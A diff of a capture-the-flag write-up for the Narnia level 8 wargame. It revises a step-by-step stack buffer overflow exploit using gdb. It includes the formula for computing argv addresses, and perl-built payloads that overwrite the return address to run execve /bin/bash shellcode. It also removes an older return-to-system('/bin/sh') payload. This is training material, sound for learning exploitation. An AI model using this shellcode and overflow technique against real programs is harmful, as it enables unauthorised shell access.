@@ -75,17 +75,6 @@ int main(int argc, char **argv){
 }
 ```
 
-Well, I tried a few things in this challenge via gdb. These are the things that worked:
-* Entering the `argv[2]` parameter as **shellcode** and overriding the return address from `func()` to `main()` which will return to **shellcode**.
-
-* Overriding the return address from `func()` to `main()` to be the `system()` function, and give it the string `"/bin/sh"` as a parameter.
-    * The string can be entered as `argv[2]`
-    * Or in the first characters of `argv[1]`
-
-The second way is more elegant (in particular inserting the string into `system()` in `argv[1]`) and therefore I will explain it:
-
-
-
 Let's look at the stack just after memset:
 ```
 gdb ./narnia8
@@ -109,30 +98,135 @@ x/40wx $sp
 ![](3.png)
 
 * Yellow - `bok`
-* Red - `blah`, contain the address of `argv[0]`
+* Red - `blah`, contain the address of `argv[1]`
 * Blue - `$bp` register
 * Green - Return falue from the `func` to the `main`.
 
+Now, let's take a look at argv[0]:
+
+```
+x/s 0xffffd7b0
+```
+
+![](4.png)
+
+Let's note where the argvs are actually located in memory:
+
+```
+x/5s 0xffffd7b0
+```
+
+![](5.png)
+
+looks familiar? This is because, in fact, the argvs go in right above the environment variables!
+
+```
+x/4s *((char **) environ)
+```
+
+![](6.png)
+
+**Conclusion:**<br />
+The formula for calculating the address of the variable argv[1] (if there is only one) is <br />
+**`&argv[1] = &environ[0] - len(argv[0]) - 1`** where the `-1` is to include the NULL at the end of the string.<br />
+
+We need a part of the string (more precisely, the 20th to 24th bytes) to contain the address of the string itself. Otherwise in the stack, the 20th byte will overwrite the address of the string and the program will no longer refer to its place in memory to continue inserting values into the stack.<br />
+
+And so when we know the size of the string in `argv[1]`, we can easily calculate its position and insert it into the string itself.<br />
+
+Since we want the string to overwrite the address back, then the length of the string should be 32 bytes (20 + 4 + 4 + 4).<br />
+
+So her address is: **`argv[1] = ((char **)enviorn) - 32 - 1 = 0xffffd7c4 - 33 = 0xffffd7a3`**
+
+So the input string can be something like:
+```
+r $(perl -e 'print "A"x20, "\xa3\xd7\xff\xff", "BBBB", "CCCC"')
+```
+```
+x/40wx $sp
+```
+
+![](7.png)
+
+```
+b *0x080491e6
+```
+```
+c
+```
+```
+x/40wx $sp
+```
+
+![](8.png)
+
+
+Okay, so far so good. But - we'd like to replace "CCCC" with the address of... of what?
+
+Can we insert shellcode as argv[2] and use its address? We will take shellcode from previous challenges and try:
+
+* shellcode (level1->level2): `\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80`
+* argv[2] == shellcode, so len(argv[2]) == 33
+
+* &argv[1] == ((char **)environ) - ((len(argv[1]) + 1) + (len(argv[2]) + 1)) == ((char **)environ) - (33 + 34) == 0xffffd7c4 - 67 == 0xffffd781
+
+* &argv[2] == ((char **)environ) - (len(argv[2]) + 1) == &argv[1] + (len(argv[1]) + 1) == 0xffffd781 + 33 == 0xffffd7a2
+
+So, let's try this:
+
+from the begining:
+```
+gdb ./narnia8
+```
+```
+b *0x080491a2
+```
+```
+b *0x080491e6
+```
+```
+r $(perl -e 'print "A"x20, "\x81\xd7\xff\xff", "BBBB", "\xa2\xd7\xff\xff"') $(perl -e 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
+```
+```
+x/40wx $sp
+```
+
+![](9.png)
+
+```
+c
+```
+```
+x/40wx $sp
+```
+
+![](10.png)
 
 
 ```
-gdb --args ./narnia8 $(perl -e 'print "A"x20 . "\xe3\xd6\xff\xff" . "B"x4 . "\x04\xd7\xff\xff"') $(perl -e 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
-```
-```
-r $(perl -e 'print "A"x20 . "\xe3\xd6\xff\xff" . "B"x4 . "\x04\xd7\xff\xff"') $(perl -e 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
+x/6s *((char **)environ) - 67
 ```
 
-```
-r $(perl -e 'print "A"x20 . "\xf5\xd6\xff\xff" . "B"x4 . "\x70\x81\xc4\xf7" . "C"x4 ."\x1e\xd7\xff\xff"') /bin/sh
-```
+![](11.png)
+
+* `-67`: (len(argv[1]) + 1) + (len(argv[2]) + 1)
+* `0xffffd781`: &argv[1]
+* `0xffffd7a2`: &argv[2], the shellcode!
 
 ```
-r $(perl -e 'print "/bin/sh;" . "A"x12 . "\xfd\xd6\xff\xff" . "B"x4 . "\x70\x81\xc4\xf7" . "C"x4 ."\xfd\xd6\xff\xff"')
+del 1
+```
+```
+del 2
+```
+```
+c
 ```
 
-```
-gdb --args ./narnia8 $(perl -e 'print "/bin/sh;" . "A"x12 . "\xfd\xd6\xff\xff" . "B"x4 . "\x70\x81\xc4\xf7" . "C"x4 ."\xfd\xd6\xff\xff"')
-```
+![](12.png)
+
+
+
 
 ## Password for the next level:
 ```
